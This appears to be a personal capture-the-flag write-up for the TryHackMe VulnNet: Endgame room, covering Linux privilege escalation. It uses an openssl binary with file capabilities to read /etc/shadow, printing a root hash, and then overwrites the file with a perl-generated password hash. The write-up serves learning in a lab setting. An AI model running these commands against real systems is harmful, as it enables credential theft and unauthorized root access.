Will run the linpeas and see how we can escalate from here.

I don't know but these SUID bits looks juicy to me.

I am doing something wrong here
![[Pasted image 20231204164010.png]]

From GTFOBINS we got to know that we have read access for Zip and Unzip but have write access for 
openssl

```
 ./openssl enc -in /etc/shadow
```
![[Pasted image 20231204184335.png]]

```
system@vulnnet-endgame:~/Utils$ ./openssl enc -in /etc/shadow
root:$6$cB/S/D17$1FhKwiSpNpdxPcWJ4q91KOsJzucvpeTr8v9CRPaNmDF5SF64BcTHwR1Bx4xP3RqxK52.uZ38MHH4rQxamADb

```

Will create a password and will try to write it on the root shadow file using the openssl

We will be using this post to generate the password
https://unix.stackexchange.com/questions/52108/how-to-create-sha512-password-hashes-on-command-line

```
perl -e 'print crypt("password","\$6\$saltsalt\$") . "\n"'  
$6$saltsalt$qFmFH.bQmmtXzyBY0s9v7Oicd2z4XSIecDzlB5KiA2/jctKu9YterLp8wwnSq.qc.eoxqOmSuNp2xS0ktL3nh/
```
![[Pasted image 20231204185114.png]]

```
./openssl enc -in "/etc/shadow" > /tmp/t
nano /tmp/t
cat /tmp/t | ./openssl enc -out "/etc/shadow"
```

And with little tweak and little scripting knowledge we were able to get the root flag

This is the write up that i have followed when i got stuck somewhere for more period of time
https://salmonsec.com/blog/2022/november/tryhackme_vulnnetendgame#google_vignette


So enumeration was basic that i use to do what i have learnt is the read and write the shadow file using Path escalation Capabilities
I have right like using Linpeas and Gtfobins
but i didn't know that i was read and write the file using it.
